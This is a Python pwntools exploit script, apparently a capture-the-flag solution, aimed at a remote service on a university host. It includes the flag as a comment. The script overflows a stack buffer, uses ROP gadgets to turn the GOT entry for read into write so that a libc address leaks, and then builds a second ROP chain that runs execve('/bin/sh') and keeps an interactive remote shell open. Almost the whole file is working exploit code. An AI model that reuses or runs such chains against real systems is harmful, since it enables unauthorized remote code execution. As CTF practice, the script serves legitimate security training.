import sys
import struct
from pwn import *
import signal

# NSH{first_write_and_then_write}

def signal_handler(sig, frame):
    print("Exiting ...")
    exit()

signal.signal(signal.SIGINT, signal_handler)

host = "lettieri.iet.unipi.it"
port = 7001

offset_to_rip = 0x20 + 8

gadget1 = 0x0000000000400b0a #: pop r15; ret; 
gadget2 = 0x0000000000400b0b #: pop rdi; ret;
gadget3 = 0x0000000000400b09 #: pop rsi; pop r15; ret;
usefulGadget = 0x00000000004008ca #: addq %rdi, (%r15); ret

got = 0x0000000000600ef8 # da vmmap
entry_read = 6 # la read è la settima funzione
got_entry_size = 8 # le entry della got sono indirizzi, quindi 8 byte
add_write_address = got + entry_read * got_entry_size # dove voglio andare a fare la add

read_plt = 0x0000000000400730
read = 0x00000000000ea450 # in libc, offset
write = 0x00000000000ea4f0  # in libc, offset
offset_read_write = write - read # 

# scrivere nell'entry della read di got aggiungendo offset
with socket.create_connection((host, port)) as conn:

    buf = b"A" * offset_to_rip
    buf += p64(gadget1)
    buf += p64(add_write_address)
    buf += p64(gadget2)
    buf += p64(offset_read_write)
    buf += p64(usefulGadget)

    # chiamare read@plt che ora punta alla write nella got e farsi mandare il contenuto
    # della got
    # preparare argomenti per la write 
    # write(int fd, const void *buf, size_t count);
    buf += p64(gadget2)
    buf += p64(0x0)
    buf += p64(gadget3)
    buf += p64(got - 512 + 8)
    buf += b"A"*8
    buf += p64(read_plt)

    # ci sarebbe ora da preparare rdx, ma non lo trovo il gadget
    # in edx ci dovrebbe essere 512 dalla precedente read
    # trovo il modo di fare sub? no
    # allora parto a leggere da più indietro! (vedi riga 41)
    conn.send(buf)
    buf = conn.recv(512)
    print("Bytes received: {}".format(len(buf)))
    buf = buf[-8:]
    set_sock_opt_address = struct.unpack("Q", buf)[0]
    print("Setsockopt address: " + hex(set_sock_opt_address))
    set_sock_opt_offset = 0x00000000000faa60
    libc_address = set_sock_opt_address - set_sock_opt_offset
    print("Libc address: " + hex(libc_address))

with remote(host, port) as conn:

    p = lambda x : p64(x)
    IMAGE_BASE_0 = libc_address 
    rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

    rop = b"A" * offset_to_rip

    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000023a5f) # 0x0000000000023a5f: pop rdi; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000002440e) # 0x000000000002440e: pop rsi; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x0000000000106725) # 0x0000000000106725: pop rdx; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000003a638) # 0x000000000003a638: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000b5b35) # 0x00000000000b5b35: syscall; ret; 
    
    conn.send(rop)
        
    while True:
        command = input("$ ")
        conn.send(command.encode())
        print(conn.recv(4096).decode())



